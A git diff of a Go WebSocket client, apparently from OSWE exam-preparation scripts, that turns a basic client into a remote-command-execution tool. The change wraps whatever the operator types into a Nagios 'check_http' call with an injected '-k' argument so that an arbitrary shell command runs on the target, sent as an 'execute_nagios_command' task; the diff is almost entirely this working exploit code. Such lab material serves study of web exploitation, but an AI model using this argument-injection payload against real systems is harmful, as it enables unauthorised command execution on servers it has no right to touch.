@@ -20,7 +20,7 @@ import (
 	"github.com/iPhantasmic/OSWE/scripts/utils"
 )
 
-// Chp 10.7.4 - WebSocket Client
+// Chp 10.7.6.1 - WebSocket client for RCE
 
 var done chan interface{}
 var interrupt chan os.Signal
@@ -28,7 +28,7 @@ var uniqid string
 var key *string
 
 // go func that continuously reads messages and then prints the contents
-func messageHandler(connection *websocket.Conn) {
+func messageHandlerRCE(connection *websocket.Conn) {
 	defer close(done)
 	for {
 		_, msg, err := connection.ReadMessage()
@@ -58,7 +58,7 @@ func messageHandler(connection *websocket.Conn) {
 }
 
 // obtains user input from stdin and sends to 'input' channel for processing
-func getInput(input chan string) {
+func getInputRCE(input chan string) {
 	result, err := bufio.NewReader(os.Stdin).ReadString('\n')
 	if err != nil {
 		log.Println(err)
@@ -67,7 +67,7 @@ func getInput(input chan string) {
 	input <- strings.TrimSpace(result)
 }
 
-func toJson(task, data string) []byte {
+func toJsonRCE(task, data string) []byte {
 	request := map[string]string{
 		"task":   task,
 		"data":   data,
@@ -119,20 +119,21 @@ func main() {
 	}
 	defer conn.Close()
 
-	go messageHandler(conn)
-	go getInput(input)
+	go messageHandlerRCE(conn)
+	go getInputRCE(input)
 
 	for {
 		select {
 		// on_open: once receive user input, convert to json and send to server
 		case cmd := <-input:
-			msg := toJson("execute_nagios_command", cmd)
+			payload := fmt.Sprintf("./check_http -I 192.168.45.233 -p 1337 -k 'test -c '%s", cmd)
+			msg := toJsonRCE("execute_nagios_command", payload)
 			err = conn.WriteMessage(websocket.TextMessage, msg)
 			if err != nil {
 				log.Println("Error when writing: ", err)
 				return
 			}
-			go getInput(input)
+			go getInputRCE(input)
 
 		// received SIGINT, terminate gracefully and close connections
 		case <-interrupt:
